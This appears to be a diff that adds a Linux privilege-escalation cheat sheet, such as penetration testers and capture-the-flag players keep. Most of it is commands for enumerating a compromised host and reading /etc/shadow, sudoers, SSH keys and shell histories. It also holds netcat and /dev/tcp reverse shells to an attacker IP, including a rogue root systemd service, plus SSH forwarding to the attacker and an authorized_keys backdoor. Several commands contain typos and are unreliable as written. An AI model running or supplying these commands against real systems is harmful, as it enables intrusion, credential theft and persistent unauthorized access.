@@ -1,0 +1,141 @@
+#Who are we?
+id
+whoami
+groups
+cat /etc/group
+
+#What are we running?
+cat /etc/issue
+cat /etc/*-release
+cat /proc/verion
+uname -a
+uname -mrs
+dmesg | grep Linux
+
+#Environment?
+set
+env
+
+#Printer?
+lpstat -a
+
+#What services are running right now?
+ps aux
+ps -ef
+cat /etc/service
+Be sure to parse out root running applications with "| grep root"
+ls -al /etc/systemd/system
+
+#Any interesting binaries within PATH?
+cat /usr/bin
+cat /sbin
+cat /usr/bin/local
+
+#Cron tasks schedules?
+crontab -l
+ls -al /var/spool/cron
+cat /etc/cron*
+Can't tell if root has a cron job? try to cat /var/log/syslog
+
+#Gather network information
+/sbin/ifconfig -a
+ifconfig -a
+cat /etc/network/interfaces
+ip addr
+iptables -L
+arp -a
+route
+hostname
+cat /etc/hosts
+cat /etc/resolve.conf
+
+#What ports are open?
+lsof -i
+netsat -antup
+netstat -antpx
+netstat -tulpn
+
+#Do we have rev shell tools?
+nc [attacker IP] [attacker port] -e /bin/bash
+which nc
+which telnet
+
+#Can we port forward?
+ssh -L 8080:127.0.0.1:80 root@[attackerIP] (Local port)
+ssh -R 8080:127.0.0.1:80 root@[attacker IP] (Remote port)
+
+#Any fun files we can see?
+cat /etc/passwd
+cat /etc/group
+cat /etc/shadow
+cat /etc/sudoers
+ls -al /home/[user]/.ssh
+ls -al /etc/ssh
+ls -al /var/mail
+ls -al /var/log
+ls -al /home
+ls -al /root
+ls -al /var/www
+ls -al /var/apache2
+Any folders in / that aren't usually there?
+
+
+#History files?
+cat ~/.bash_history
+cat ~/.nano_history
+cat ~/.mysql_history
+cat ~/.php_history
+
+#SUID & GUID
+find / -perm -g=s -type f 2>/dev/null (Run as the group)
+find / -perm -u=s -type f 2>/dev/null (Run as the owner)
+https://gtfobins.github.io/#
+
+#Where can we write and execute from?
+find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null
+
+#Python interactive shell
+which python
+python -V
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+#The usual routes
+uname -a (kernel exploit)
+ls -al /home/[user]/.ssh (lateral movement)
+cat /etc/ssh/sshd_config (do ssh keys play a factor? Is pubkey authenication enabled?)
+cat /etc/cron* (What cron job can we mess with?)
+sudo -l (what can we sudo?)
+cat /etc/systemd/system/ (do we have a service we can re-write?):
+
+'
+[Unit]
+Description=rooted
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/[attacker IP]/[attacker port] 0>&1'
+
+[Install]
+WantedBy=multi-user.target
+'
+
+See a file that could give you root but can't edit it? Is it a symlink? If so:
+ln -sfn [file_name]
+it's yours now :D
+
+Stuck in a restricted shell? https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf
+
+can we make an ~/.ssh/authorized_keys file?
+ssh-keygen -t rsa -b 4096
+copy the file contents of the new id_rsa.pub
+curl,nano, or echo the contents into /home/[user]/.ssh/authorized_keys
+Test you can connect using the private key!
+
+An even more extensive cheat sheet with detailed steps (if none of this worked, these might help!): https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
+
+If all else fails: linpeas!
+
+
+
+
